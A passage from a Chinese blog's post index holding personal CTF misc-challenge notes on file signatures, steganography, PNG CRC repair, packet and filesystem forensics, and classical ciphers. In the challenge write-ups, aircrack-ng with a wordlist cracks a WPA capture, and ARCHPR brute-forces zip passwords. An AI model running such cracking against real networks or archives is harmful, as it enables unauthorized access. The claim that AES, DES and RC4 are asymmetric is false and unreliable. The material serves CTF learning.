BA(3)\nQuicktime (mov)：文件头：6D 6F 6F 76\nWindows Media (asf)：文件头：30 26 B2 75 8E 66 CF 11\nMIDI (mid)：文件头：4D 54 68 64\n\n代码文件\nXML (xml)：文件头：3C 3F 78 6D 6C\nHTML (html)：文件头：68 74 6D 6C 3E\n\n其他类型\nQuicken (qdf)：文件头：AC 9E BD 8F\nWindows Password (pwl)：文件头：E3 82 85 96\nWindows证书文件(der)：文件头：30 82 03 C9\nCAD (dwg)：文件头：41 43 31 30\nWindows Shortcut (lnk)：文件头：4C 00 00 00\nWindows reg(reg)：文件头：52 45 47 45 44 49 54 34\n\nexiftool 查看图片信息$ exiftool photo.jpg #查看所有信息\n$ exiftool -a -u -g1 photo.jpg #查看所有元信息，包括重复和未知标签，并按小组排列\n$ exiftool -s -ImageSize -ExposureTime photo.jpg #查看图片尺寸\n$ exiftool -gps:all&#x3D;&quot;&quot; photo.jpg  #有些相机会记录拍照时的GPS定位信息。如果你不希望别人看到使用该命令删除gps信息\n$ exiftool -all&#x3D;&quot;&quot; photo.jpg  #删除所有信息\n$ exiftool -all&#x3D;&quot;&quot; --exif:all photo.jpg  #删除EXIF以外的所有信息\n\n# 将文件名（带日期的）设置到图片日期中（程序会自动识别日期格式）\n$ exiftool &quot;-DateTimeOriginal&lt;filename&quot; &quot;2009-09-30 15-28-16.jpg&quot;\n# 将文件名设置为文件大小（带格式）\n$ exiftool &quot;-filename&lt;%f_$imagesize.%e&quot; IMG_0894.JPG\n\n组合拳01文件分离png和rar，png在kali里打不开，rar加密，png修改宽高得到密码，rar解密解压得到.pcapng格式的流量包，流量中搜索关键字png追踪流得到flag。\n02伪加密嵌套真加密，修复伪加密后得到真加密的压缩包和一个word文档，密码在word隐写中，多次解密，得到真加密的密码。解压真加密的压缩包，得到音频文件，产看音频文件频谱图得到flag。\n","slug":"杂项摆烂小记01","date":"2023-08-25T12:30:34.000Z","categories_index":"杂项","tags_index":"杂项","author_index":"南瓜の无名"},{"id":"8610bc7b74f181a47efb2d99d885966d","title":"杂项摆烂的小记_基础篇_02","content":"\n\n\n\n\n\n\n\n\n从这里开始就是攻防世界难度2的杂项题了。里面有很简单的题，也有复杂一点的题，嗯，比如：this_is_flag。\n新的盐pyc文件头\n\n\n\n\n\n\n\n\n03F30D0A\npyc文件反编译得到python源代码\n在线16进制转文件\n\n\n\n\n\n\n\n\nhttps://tool.hiofd.com/hex-convert-file-online/\n使用010editor粘贴hex\n\n\n\n\n\n\n\n\nEdit&gt;Paste From&gt;Paste from Hex text\nlsb隐写得到二维码import PIL.Image as Image\nimg &#x3D; Image.open(&#39;low.bmp&#39;)\nimg_tmp &#x3D; img.copy()\npix &#x3D; img_tmp.load()\nwidth,height &#x3D; img_tmp.size\n\n# 遍历每个像素，判断最低位是否为0，\n# 如果是则将该像素设置为0，否则将该像素设置为255。\nfor w in range(width):\n   for h in range(height):\n      if pix[w,h]&amp;1 &#x3D;&#x3D; 0:\n         pix[w,h] &#x3D; 0\n      else:\n         pix[w,h] &#x3D; 255\nimg_tmp.show()\n\n\n\n\n\n\n\n\n\n\n尝试把bmp格式后缀改成png格式后缀。\npng文件crc爆破宽高png的文件头：\n\n（固定）八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头\n（固定）四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13\n（固定）四个字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示（IDCH）\n（可变）13位数据块（IHDR）\n前四个字节代表该图片的宽\n后四个字节代表该图片的高\n后五个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method\n\n\n（可变）剩余四字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行crc计算得到\n\n爆破脚本：\nimport zlib\nimport struct\nimport argparse\nimport itertools\n\n\nparser &#x3D; argparse.ArgumentParser()\nparser.add_argument(&quot;-f&quot;, type&#x3D;str, default&#x3D;None, required&#x3D;True,\n                    help&#x3D;&quot;输入同级目录下图片的名称&quot;)\nargs  &#x3D; parser.parse_args()\n\n\nbin_data &#x3D; open(args.f, &#39;rb&#39;).read()\ncrc32key &#x3D; zlib.crc32(bin_data[12:29]) # 计算crc\noriginal_crc32 &#x3D; int(bin_data[29:33].hex(), 16) # 原始crc\n\n\nif crc32key &#x3D;&#x3D; original_crc32: # 计算crc对比原始crc\n    print(&#39;宽高没有问题!&#39;)\nelse:\n    input_ &#x3D; input(&quot;宽高被改了, 是否CRC爆破宽高? (Y&#x2F;n):&quot;)\n    if input_ not in [&quot;Y&quot;, &quot;y&quot;, &quot;&quot;]:\n        exit()\n    else: \n        for i, j in itertools.product(range(4095), range(4095)): # 理论上0x FF FF FF FF，但考虑到屏幕实际&#x2F;cpu，0x 0F FF就差不多了，也就是4095宽度和高度\n            data &#x3D; bin_data[12:16] + struct.pack(&#39;&gt;i&#39;, i) + struct.pack(&#39;&gt;i&#39;, j) + bin_data[24:29]\n            crc32 &#x3D; zlib.crc32(data)\n            if(crc32 &#x3D;&#x3D; original_crc32): # 计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定\n                print(f&quot;\\nCRC32: &#123;hex(original_crc32)&#125;&quot;)\n                print(f&quot;宽度: &#123;i&#125;, hex: &#123;hex(i)&#125;&quot;)\n                print(f&quot;高度: &#123;j&#125;, hex: &#123;hex(j)&#125;&quot;)\n                exit(0)\n\n\n十六进制字符串每两个分组十六进制，转成十进制后-128(偏移量为128)，再转成ASCII码。\n利用词频分析解密\n\n\n\n\n\n\n\n\nhttps://quipqiup.com/\nEg qnlyjtcnzydl z umaujejmjetg qeydsn eu z bsjdtx tw sgqtxegc al kdeqd mgeju tw\nyrzegjsoj zns nsyrzqsx kejd qeydsnjsoj\nEw ltm fgtk jds kzl tw sgqtxegc m kerr csj jds wrzc kdeqd eu qrzuueqzr\nqeydsn_eu_gtj_usqmnejl_du\n\n三原色文本转图片wc -l test.txt\n# -l：显示文件中的行数。 -w：显示文件中的字数。 -c：显示文件中的字节数。\n\nfrom ast import literal_eval\nfrom PIL import Image\nf &#x3D; open(&#39;flag.txt&#39;, &#39;r&#39;)\ncorl &#x3D; [literal_eval(line) for line in f.readlines()]\nf.close()\nimg &#x3D; Image.new(&#39;RGB&#39;, (270, 270), &#39;#ffffff&#39;)\nk&#x3D;0\nfor i in range(246):\n   for j in range(246):\n      img.putpixel ([i , j], corl[k])\n      k&#x3D;k+1\n#   输出图片\nimg.save(&quot;flag.png&quot;)\n\n视频转音频隐写视频题目发现声音不正常，使用MKVToolnixPortable提取音频文件，再使用audacity分析音频文件。\ngz压缩包tar命令解压常用的tar选项包括：\n\n-c：创建一个新的tar存档文件\n-x：从tar存档文件中提取文件\n-t：列出tar存档文件的内容\n-f：指定tar存档文件的名称\n-v：显示详细的操作信息\n-z：使用gzip进行压缩或解压缩\n-j：使用bzip2进行压缩或解压缩\n\n# 要提取tar存档文件中的内容，可以使用以下命令：\ntar -xvf archive.tar\n# 要查看tar存档文件中的内容列表，可以使用以下命令：\ntar -tvf archive.tar\n\nLinux下文件的打包、解压缩指令——tar，gzip，bzip2，unzip，rar\n\n\n\n\n\n\n\n\n参考网址：https://cloud.tencent.com/developer/article/1409870https://www.cnblogs.com/yhjoker/p/7568680.html\ngit 文件泄露\n发现泄露的 git 目录，使用 git log 查看 git 记录\n使用 git stash list 查看修改列表\n使用 git stash show 校验列表中存储的文件\n使用 git stash apply 重新进行存储，复原上面的文件\n\ngit stash 用法总结和注意点\n\n\n\n\n\n\n\n\nhttps://www.cnblogs.com/zndxall/archive/2018/09/04/9586088.html\next2 文件系统数据mkdir &#x2F;tmp&#x2F;forensic100\nmount -o loop forensic100 &#x2F;tmp&#x2F;forensic100&#x2F;\n# 挂载文件\ncd &#x2F;tmp&#x2F;forensic100&#x2F;\ngrep -r key.txt\nfile key.txt\ngunzip &lt; 1\n\n关于 gunzip 1 报错 | gunzip &lt; 1 成功\n使用”gunzip 1“命令，gunzip会尝试将文件名”1”解释为gzip格式的压缩文件，但由于文件名没有标准的后缀，所以gunzip报告了”unknown suffix – ignored”错误。\n“gunzip &lt; 1“命令，使用输入重定向，将文件”1”作为stdin输入给gunzip命令。在这种情况下，gunzip不需要根据文件名后缀来判断，而是直接从stdin读取数据并进行解压，因此可以正常执行。\n\n0和1的二进制字符转ascii码失败如果不能转成ASCII码，可以尝试把0和1调换位置。\n磁盘数据恢复sudo apt install extundelete\n# 安装extundelete工具\n\nextundelete --restore-all file_name\n# 恢复文件\n\nextundelete工具extundelete是一个用于恢复被删除的文件的工具，它可以用于ext3和ext4文件系统。\n它基于The Sleuth Kit工具包，并提供了一种简单的方式来查找和恢复被误删除的文件。\nextundelete命令的基本语法：extundelete [选项] [设备]\n常用的extundelete选项包括：\n\n–restore-all：尝试恢复所有被删除的文件。\n–restore-file &lt;文件路径&gt;：尝试恢复指定路径的文件。\n–after &lt;日期&#x2F;时间&gt;：仅恢复在指定日期&#x2F;时间之后被删除的文件。\n–output-dir &lt;目录路径&gt;：指定恢复的文件输出目录。\n–restore-directory &lt;目录路径&gt;：尝试恢复指定路径的目录及其内容。\n–inode &lt;inode编号&gt;：尝试恢复指定inode编号的文件。\n\n例如，要恢复一个被删除的文件，可以使用以下命令：extundelete –restore-file &#x2F;dev&#x2F;sda1 –output-dir &#x2F;恢复目录\n如果要恢复所有被删除的文件，可以使用–restore-all选项：extundelete –restore-all &#x2F;dev&#x2F;sda1 –output-dir &#x2F;恢复目录\nfls 命令fls 命令是一种用于在文件系统镜像或设备上列出文件和目录的命令。\n它是The Sleuth Kit（TSK）工具包中的一个工具，用于数字取证和文件系统分析。\nfls命令的基本语法： fls [选项] [文件系统镜像&#x2F;设备]\n常用的fls选项包括：\n\n-r：递归列出子目录中的文件和目录。\n-m：在输出中显示文件的元数据（例如，创建时间、修改时间等）。\n-o：以文件的偏移量而不是inode编号进行排序。\n-l：以长格式显示输出。\n-f：显示已删除的文件和目录。\n-v：显示详细的输出信息。\n\n例如，要在名为image.dd的文件系统镜像上列出所有文件和目录，可以使用以下命令： fls image.dd\n如果要递归列出子目录中的文件和目录，可以使用 -r 选项： fls -r image.dd\n要显示文件的元数据信息，可以使用 -m 选项： fls -m image.dd\n如果要显示已删除的文件和目录，可以使用 -f 选项： fls -f image.dd\nfls 命令还可以与其他The Sleuth Kit工具一起使用，例如icat命令来提取文件的内容，istat命令来获取文件的元数据信息等。\n修改文件权限chmod +x file_name\n\n题目：很普通的数独25张数独图片，改变1，5，21图片位置，把有数字的方块涂黑，得到二维码。\n题目：我们的秘密是绿色的压缩包内有一张日历图片，Our Secret（文件加密）工具需要的密码是日历中绿色的部分，解密后得到加密的压缩包。\n压缩包提示压缩包密码是生日，ARCHPR爆破8位生日数字，解压得到新的加密压缩包和一个文本文件。\n利用文本文件，使用ARCHPR进行明文攻击，得到伪加密的压缩包。修复后解压的到一段文本，栅栏密码解密后得到flag\nwireshark流量分析modbus协议wireshark输入modbus过滤追踪tcp流\n工业设备消息传输使用modbus协议。\n利用modbus读取设备的相关数据有01，02，03，04功能码，\n01是读取线圈状态：取得一组逻辑线圈的当前状态（ON&#x2F;OFF ），\n02是读取输入状态:取得一组开关输入的当前状态（ON&#x2F;OFF），\n03是读取保持寄存器:在一个或多个保持寄存器中取得当前的二进制值，\n04读取输入寄存器：在一个或多个输入寄存器中取得当前的二进制。\n\npng图片数据流还原\n根据题目提示，分组字节流-字符串-搜索关键字flag或者png等等，发现有数据包中有图片传输的痕迹。\n分组字节流-十六进制-搜索PNG的文件头89 50 4E 47，找到一条TCP报文，然后追踪TCP流，查看原始数据。\n从图片头89 50 4E 47一直到图片尾 AE 42 60 82，复制到010editor中保存，修改文件后缀名为png。\n\n利用工具提取流量包中png图片\n\n\n\n\n\n\n\n\n上面的步骤不想手动操作，可以使用工具。当然第一次还是建议手动尝试，体验一下过程。\n# 安装tcpxtract\nsudo apt-get install tcpxtract  \n\ntcpxtract -f test.pcap\n# 提取文件数据\n\n使用 NetworkMiner 提取文件\n\n\n\n\n\n\n\n\nhttps://www.netresec.com/?page=NetworkMiner先用wireshack把流量包另存为格式为pacp的文件。因为pacpng文件需要正式版才可以打开。\nNetworkMiner是一款windows平台下开放源代码的网络取证分析工具，同时也是一款比较好的协议分析工具，它通过数据包嗅探或解析PCAP 文件能够检测操作系统，主机名和网络主机开放的端口。支持对FTP, TFTP, HTTP, SMB 和 SMTP协议的文件提取。\n数据隐写\n观察 Source、Destination、Protocol、Length、Time 列变化规律\n观察 Info 列，srcport，desport，Len 三个参数的变化规律\n\n# 利用 tshark 过滤，更直观的分析数据\ntshark -r test.pcap -Tfields -e udp.srcport | cut -c 4\n\n得到私钥解密加密文档\nFTP传输，推测存在加密传输文档的流量包\n\n发现私钥\n\n流量包通过foremost分离出加密文档key.txt\n\n保存私钥为psa.key用openssl解密\n\n\n命令：openssl rsautl -decrypt -in key.txt -inkey psa.key -out flag.txt\n# -in 为要解密的加密文档 -inkey 为密钥 -out 为输出文档\n","slug":"杂项摆烂小记02","date":"2023-08-25T12:30:34.000Z","categories_index":"杂项","tags_index":"杂项","author_index":"南瓜の无名"},{"id":"faf6da1b45f063e4da641b33779c9791","title":"杂项摆烂的小记_基础篇_03","content":"\n\n\n\n\n\n\n\n\n这里是杂项难度3的题，虽然这个难度其实没有意义。已经完成112道题了，学习到了很多新的东西，继续加油吧，少年！\n新的盐.swf文件查看帧swf文件，用PotPlayer打开可以进行每一帧的遍历\nxortool（异或工具）xortool是一个多字节异或加密破解工具。\n\n\n\n\n\n\n\n\n\ngithub网址：https://github.com/raddyfiy/xortool-for-Windows\n题目：传感器1已知ID为0x8893CA58的温度传感器的未解码报文为：3EAAAAA56A69AA55A95995A569AA95565556\n此时有另一个相同型号的传感器，其未解码报文为：3EAAAAA56A69AA556A965A5999596AA95656\n请解出其ID，提交flag{不含0x的hex值}\n\n\n\n\n\n\n\n\n\nhttps://cloud.tencent.com/developer/article/1940281\n用AAAAA56A69AA55A95995A569AA95565556(需要去掉3E前缀)运行：\n#!&#x2F;usr&#x2F;bin&#x2F;env python\n# coding:utf-8\n\nimport re\n\n# hex1 &#x3D; &#39;AAAAA56A69AA55A95995A569AA95565556&#39; # #  0x8893CA58\nhex1 &#x3D; &#39;AAAAA56A69AA556A965A5999596AA95656&#39;\n\n\ndef bintohex(s1):\n    s2 &#x3D; &#39;&#39;\n    s1 &#x3D; re.findall(&#39;.&#123;4&#125;&#39;, s1)\n    print(&#39;每一个hex分隔:&#39;, s1)\n    for i in s1:\n        s2 +&#x3D; str(hex(int(i, 2))).replace(&#39;0x&#39;, &#39;&#39;)\n\n    print(&#39;ID:&#39;, s2)\n\n\ndef diffmqst(s):\n    s1 &#x3D; &#39;&#39;\n    s &#x3D; re.findall(&#39;.&#123;2&#125;&#39;, s)\n    cc &#x3D; &#39;01&#39;\n    for i in s:\n        if i &#x3D;&#x3D; cc:\n            s1 +&#x3D; &#39;0&#39;\n        else:\n            s1 +&#x3D; &#39;1&#39;\n        cc &#x3D; i  # 差分加上cc &#x3D; i\n\n    print(&#39;差分曼切斯特解码:&#39;, s1)\n    bintohex(s1)\n\n\ndef mqst(s):  # 只能算曼切斯特编码,无法算差分\n    mdict &#x3D; &#123;&#39;5&#39;: &#39;00&#39;, &#39;6&#39;: &#39;01&#39;, &#39;9&#39;: &#39;10&#39;, &#39;A&#39;: &#39;11&#39;&#125;\n    a1 &#x3D; &#39;&#39;.join(mdict[i] for i in s)\n    a2 &#x3D; &#39;&#39;.join(mdict[i][::-1] for i in s)\n    print(&#39;曼切斯特解码:   &#39;, a1)\n    print(&#39;曼切斯特解码2:  &#39;, a2)\n    bintohex(a1)\n    bintohex(a2)\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    bin1 &#x3D; bin(int(hex1, 16))[2:]\n    diffmqst(bin1)\n\n    mqst(hex1)\n\n# 差分曼切斯特编码为8024d8845abf34119\n# 左边去掉5个字符，右边去掉4个字符，换成大写就是flag\n\n题目：打开电动车\n\n\n\n\n\n\n\n\nhttps://www.freebuf.com/articles/wireless/191534.html使用HackCube-Special分析固定码信号\n钥匙信号(PT224X) &#x3D; 同步引导码(8bit) + 地址位(20bit) + 数据位(4bit) + 停止码(1bit)\n题目：奇怪的TTL字段with open(&#39;ttl.txt&#39;) as f:\n    lines &#x3D; f.readlines()\nn_num &#x3D; []\n# 分析出所有的数\nfor i in lines:\n    if i!&#x3D;&#39;\\n&#39;:\n        n_num.append(int(i.replace(&#39;TTL&#x3D;&#39;,&#39;&#39;)))\n# 拿到每个TTL值的高位\nrlt &#x3D; &#39;&#39;\nfor i in range(0,len(lines)):\n    tmp &#x3D; bin(n_num[i])[2:]\n    tmp &#x3D; &#39;0&#39;*(8-len(tmp)) + tmp\n    rlt +&#x3D; tmp[0:2]\n# 得到最终的结果并存到文件中\nrlt2 &#x3D; &#39;&#39;\nfor i in range(0,len(rlt),8):\n    rlt2 +&#x3D; chr(int(rlt[i:i+8],2))\nwith open(&#39;abc.txt&#39;,&#39;w&#39;) as f:\n    f.write(rlt2.rstrip())\n\n\n\n\n\n\n\n\n\n\nEdit&gt;Paste From&gt;Paste from Hex text\n以FFD8开头，FFD9结束，是jpeg格式的图片。\n分离，拼接二维码。\n题目：salease （xx.logicdata文件）logicdata文件，用Saleae软件打开。\nSaleae是一个逻辑分析工具，不仅可以记录数字和模拟两种信号，还可以解码 SPI、I2C、串行、1-Wire、CAN、Manchester、I2S 等协议。\n一共四个串口，猜测是SPI传输协议，再根据其波形判断0：规律性 等宽 猜测是 CLK1：无波形 猜测是主输出端 MOSI2：波形宽度不一 猜测携带数据 为主输入端 MISO3：数据传输是低电平 猜测为CS偏选端\n观察波形，发现channel0是具有周期性的方波，应为时钟信号。\n根据时钟频率以及通讯方式猜测是属于 SPI 通讯，并且SPI协议正好使用了芯片上的4个引脚，猜测logicdata文件应该用SPI协议进行分析。\n分析数据处出现flag，导出数据并用文本编辑器处理，得到flag。\n题目：Keyes_secret对着键盘比划一下，就茅塞顿开了。\nTRFVG F\nWSXCV L\nGRDXCVB A\nCVGRED G\n&#123;WSX I\nIUYHNBV S&#x2F;Z\nTRFVB C\nTRFVB C\nQWERTY _\nQAZSCE K\nWSXCDE E\nEFVT Y\nYHNMKJ b\nTGBNMJUY O\nGRDXCVB A\nMNBVCDRTGHU R\nWSXCFE D\nQWERTY _\nTRFVB C\nWSX I\nNBVCXSWERF P\nRFVGYHN H\nWSXCDE E\nMNBVCDRTGHU&#125; R\n\n\n\n\n\n\n\n\n\n\n杂项很好玩，你永远可以相信出题人的脑洞。\n题目：[中等]QR1能隐隐约约看到二维码，但是图片很大，5330*5330；\n调整图片大小为533*533大小，Windows自带的照片功能就可以；\nstegslove得到二维码。\n隐写术图片隐写-盲水印git clone https:&#x2F;&#x2F;gitcode.net&#x2F;mirrors&#x2F;chishaxie&#x2F;blindwatermark.git\ncd blindwatermark\n# 可以看到里面有一个requirements.txt的文件\npython2 -m pip install -r requirements.txt\n# python3 -m pip install -r requirements.txt\n# 注意：新版kali上python3的版本过高，导致pip安装失败，建议只安装python2的包\n\n# 提取盲水印（需要原图）\n# 注意程序python2和python3版本的加解密结果会有所不同，主要原因是python2和python3 random的算法不同，如果要让python3兼容python2的random算法请加 --oldseed参数。\npython2 bwm.py decode day1.png(原图) day2.png(有水印的图片) flag.png(输出的水印)\npython bwmforpy3.py decode day1.png(原图) day2.png(有水印的图片) flag.png(输出的水印) --oldseed\n\nStegosaurus隐写-pyc文件Stegosaurus是一种隐写工具，允许在Python字节码（pyc或pyo）文件中嵌入任意有效载荷。嵌入过程不会更改载体文件的运行时行为或文件大小，通常会导致编码密度较低。有效负载分散在整个字节码中，因此字符串等工具不会显示实际有效负载。\n\n\n\n\n\n\n\n\n\nhttps://github.com/AngelKitty/stegosaurus/tree/master对于pyc或pyo文件进行隐写\n# 查看帮助文档\npython -m stegosaurus -h\n# 使用\npython stegosaurus.py -x test.pyc\n\n音频隐写sox+multimon-ng先用sox把wav转为raw\nsox -t wav latlong -esigned-integer -b16 -r 22050 -t raw latlong.raw\n# -t wav：指定输入文件的格式为wav。\n# latlong：输入文件的名称。\n# -esigned-integer：指定采样数据的编码格式为有符号整数。\n# -b16：指定采样数据的位深度为16位。\n# -r 22050：指定采样率为22050 Hz。\n# -t raw：指定输出文件的格式为原始音频数据。\n# latlong.raw：输出文件的名称。\n\n# multimon-ng是一个专门解码aprs、psk等业余无线电数字通信协议的工具\nmultimon-ng -t raw -a AFSK1200 latg.raw\n# -t raw：指定输入文件的格式为原始音频数据。\n# -a AFSK1200：指定音频调制方式为AFSK1200。\n# latlong.raw：输入文件的名称。\n\nDeepSound隐写DeepSound是一款可以将文件添加到歌曲中的软件，可把非常私密的文件隐藏在歌曲里。\ncloacked-pixel隐写\n\n\n\n\n\n\n\n\ngithub镜像网址：https://gitcode.net/mirrors/livz/cloacked-pixel?utm_source=csdn_github_accelerator缺少的模块检查补充：https://blog.csdn.net/Swaynie/article/details/128344103已安装却依然提示缺少pillow包：https://blog.csdn.net/weixin_44846959/article/details/100694234\n\n加密:\npython lsb.py hide big.png 1.txt 123456\nhide:表示加密模式;\nbig.png:待加密的png图片;\n1.txt:存放payload;\n123456:加密的密码\n\n\n\n\n解密:\npython lsb.py extract big.png-stego.png 3.txt 123456\nextract:表示解密模式;\nbig.png-stego.png:待解密的png图片;\n3.txt:存放导出的payload;\n123456:解密密码\n\n\n\n\n分析:\npython lsb.py analyse big.png-stego.png\nanalyse:表示分析模式;\nbig.png-stego.png:待分析的png图片;\n运行后会对图像进行分析，将其分割成块，标记每个块的最低有效位\n\n\n\n\n\n编码和密码维吉尼亚密码\n\n\n\n\n\n\n\n\n在线爆破维吉尼亚密码：https://www.guballa.de/vigenere-solver\n30余种加密编码类型的密文特征分析\n\n\n\n\n\n\n\n\nhttps://cloud.tencent.com/developer/article/1748394\nAES、DES、RC4、Rabbit、Triple DES（3DES）这些都是非对称性加密算法，就是引入了密钥，密文特征与Base64类似.\n# 结尾&#x3D;&#x3D;不一定是base64，有可能是AES加密，密钥是CTF\nU2FsdGVkX1+VpmdLwwhbyNU80MDlK+8t61sewce2qCVztitDMKpQ4fUl5nsAZOI7bE9uL8lW&#x2F;KLfbs33aC1XXw&#x3D;&#x3D;\n# 解密网址：https:&#x2F;&#x2F;www.sojson.com&#x2F;encrypt_aes.html\n\nNihilist 密码Nihilist这个替换密码又叫关键字密码，属于Polybius密码的变形种类，利用密钥构建棋盘矩阵，如果是26个字母作为明文的信息，构建一个5*5的矩阵，将字母不重复的依次填入矩阵，并且i和j是等价的。\n特点：纯数字，只有1-5，密文长度为偶数\n# 题目：Keyword后半部分解密脚本\ntxt &#x3D; &#39;PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;&#39;\ntable &#x3D; &#39;LOVEKFCABDGHIJMNPQRSTUWXY&#39;\nflag&#x3D;&#39;&#39;\n\nfor i in txt:\n\tif i in string.ascii_lowercase: \n\t\tindex &#x3D; table.lower().index(i)\n\t\tflag +&#x3D; string.ascii_lowercase[index] \n\t\tcontinue \n\tif i in string.ascii_uppercase:\n\t\tindex &#x3D; table.upper().index(i) \n\t\tflag +&#x3D; string.ascii_uppercase[index] \n\t\tcontinue\nflag +&#x3D; i \nprint flag\n","slug":"杂项摆烂小记03","date":"2023-08-25T12:30:34.000Z","categories_index":"杂项","tags_index":"杂项","author_index":"南瓜の无名"},{"id":"a3fa8ac179f7a4b392edba6f23be541f","title":"杂项摆烂的小记_进阶篇_05","content":"\n\n\n\n\n\n\n\n\n这里是攻防世界难度5的题目，不知不觉，进度条已过大半。到这里很多题就有些吃力了，更多的记录一些题目的题解而不是对于知识点的总结。拓展了很多新的知识面，不能浅尝辄止呀，要更进一步！\n新的盐CRC爆破图片宽高\n\n\n\n\n\n\n\n\n之前写过，但是忘记具体的内容了，重新学习一下。参考：https://blog.csdn.net/qq_47875210/article/details/126171502\n\n\n\n\n\n\n\n\n\n\ncrc在线网站：http://www.ip33.com/crc.html\npython脚本：\nimport zlib\nimport struct\nimport argparse\nimport itertools\n\n\nparser &#x3D; argparse.ArgumentParser()\nparser.add_argument(&quot;-f&quot;, type&#x3D;str, default&#x3D;None, required&#x3D;True,\n                    help&#x3D;&quot;输入同级目录下图片的名称&quot;)\nargs  &#x3D; parser.parse_args()\n\n\nbin_data &#x3D; open(args.f, &#39;rb&#39;).read()\ncrc32key &#x3D; zlib.crc32(bin_data[12:29]) # 计算crc\noriginal_crc32 &#x3D; int(bin_data[29:33].hex(), 16) # 原始crc\n\n\nif crc32key &#x3D;&#x3D; original_crc32: # 计算crc对比原始crc\n    print(&#39;宽高没有问题!&#39;)\nelse:\n    input_ &#x3D; input(&quot;宽高被改了, 是否CRC爆破宽高? (Y&#x2F;n):&quot;)\n    if input_ not in [&quot;Y&quot;, &quot;y&quot;, &quot;&quot;]:\n        exit()\n    else: \n        for i, j in itertools.product(range(4095), range(4095)): # 理论上0x FF FF FF FF，但考虑到屏幕实际&#x2F;cpu，0x 0F FF就差不多了，也就是4095宽度和高度\n            data &#x3D; bin_data[12:16] + struct.pack(&#39;&gt;i&#39;, i) + struct.pack(&#39;&gt;i&#39;, j) + bin_data[24:29]\n            crc32 &#x3D; zlib.crc32(data)\n            if(crc32 &#x3D;&#x3D; original_crc32): # 计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定\n                print(f&quot;\\nCRC32: &#123;hex(original_crc32)&#125;&quot;)\n                print(f&quot;宽度: &#123;i&#125;, hex: &#123;hex(i)&#125;&quot;)\n                print(f&quot;高度: &#123;j&#125;, hex: &#123;hex(j)&#125;&quot;)\n                exit(0)\n\n\n题目：恶臭的数据包\n\n\n\n\n\n\n\n\n题目提示：野兽前辈想玩游戏，但是hacker妨碍了他连上无线网，前辈发出了无奈的吼声。\n提示无线网，打开数据包，wifi名字是mamawoxiangwantiequan，使用aircrack-ng破解密码，得到密码12345678\naircrack-ng cacosmia.cap -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt\n\n解密数据包\nairdecap-ng cacosmia.cap -e mamawoxiangwantiequan -p 12345678\n\n将解密后的新数据包用wireshark打开，另存为pcap格式，使用NetworkMiner进行分析\n得到恶臭的图片。使用binwalk分离，得到加密的压缩包。\n查看NetworkMiner下的credentials模块，得到一串session字符串，进行jwt解码，得到提示“for security, I set my password as a website which i just pinged before”\n被ping过的网站，猜测密码是ICMP协议通信的网站的或者DNS地址，\nNetworkMiner下的DNS模块发现，有一条DNS Answer的值为127.0.0.1，十分可疑，对应DNS Query的值为 26rsfb.dnslog.cn，就是压缩包密码。\n解密解压得到flag。\n题目：ext3strings filename | grep flag\n\n得到flag.txt目录。直接用360压缩打开这个文件，找到flag.txt。base64解码得到flag。\n题目：broken_secret\n\n\n\n\n\n\n\n\n虽然看了官方wp也没看懂，但是也确实学到了新东西。\n\n打开pdf报错，用010editor打开，里面有几个flag是假的\n将@bj全部修改为obj\n将NeedsRender的false改为true\n使用pdfstreamdumper查看文件\n根据图片和文字解密，脚本如下\n\n# Python program to conver \n# altered DNA to protein \n  \nseq &#x3D; &quot;AUCUAGAGGGAAGCUCUGCUGUACUAGAUGAUUUCGUCGUAGACUCACGAAUAGGAACUGGAUGAAAGGUAGGAUGCUUAC&quot;\n  \n  \ndef translate(seq): \n    table &#x3D; &#123; \n        &#39;AUA&#39;:&#39;I&#39;, &#39;AUC&#39;:&#39;I&#39;, &#39;AUU&#39;:&#39;I&#39;, &#39;AUG&#39;:&#39;M&#39;, \n        &#39;ACA&#39;:&#39;T&#39;, &#39;ACC&#39;:&#39;T&#39;, &#39;ACG&#39;:&#39;T&#39;, &#39;ACU&#39;:&#39;T&#39;, \n        &#39;AAC&#39;:&#39;N&#39;, &#39;AAU&#39;:&#39;N&#39;, &#39;AAA&#39;:&#39;K&#39;, &#39;AAG&#39;:&#39;K&#39;, \n        &#39;AGC&#39;:&#39;S&#39;, &#39;AGU&#39;:&#39;S&#39;, &#39;AGA&#39;:&#39;R&#39;, &#39;AGG&#39;:&#39;R&#39;,  \n        &#39;CUA&#39;:&#39;L&#39;, &#39;CUC&#39;:&#39;L&#39;, &#39;CUG&#39;:&#39;L&#39;, &#39;CUU&#39;:&#39;L&#39;, \n        &#39;CCA&#39;:&#39;P&#39;, &#39;CCC&#39;:&#39;P&#39;, &#39;CCG&#39;:&#39;P&#39;, &#39;CCU&#39;:&#39;P&#39;, \n        &#39;CAC&#39;:&#39;H&#39;, &#39;CAU&#39;:&#39;H&#39;, &#39;CAA&#39;:&#39;Q&#39;, &#39;CAG&#39;:&#39;Q&#39;, \n        &#39;CGA&#39;:&#39;R&#39;, &#39;CGC&#39;:&#39;R&#39;, &#39;CGG&#39;:&#39;R&#39;, &#39;CGU&#39;:&#39;R&#39;, \n        &#39;GUA&#39;:&#39;V&#39;, &#39;GUC&#39;:&#39;V&#39;, &#39;GUG&#39;:&#39;V&#39;, &#39;GUU&#39;:&#39;V&#39;, \n        &#39;GCA&#39;:&#39;A&#39;, &#39;GCC&#39;:&#39;A&#39;, &#39;GCG&#39;:&#39;A&#39;, &#39;GCU&#39;:&#39;A&#39;, \n        &#39;GAC&#39;:&#39;D&#39;, &#39;GAU&#39;:&#39;D&#39;, &#39;GAA&#39;:&#39;E&#39;, &#39;GAG&#39;:&#39;E&#39;, \n        &#39;GGA&#39;:&#39;G&#39;, &#39;GGC&#39;:&#39;G&#39;, &#39;GGG&#39;:&#39;G&#39;, &#39;GGU&#39;:&#39;G&#39;, \n        &#39;UCA&#39;:&#39;S&#39;, &#39;UCC&#39;:&#39;S&#39;, &#39;UCG&#39;:&#39;S&#39;, 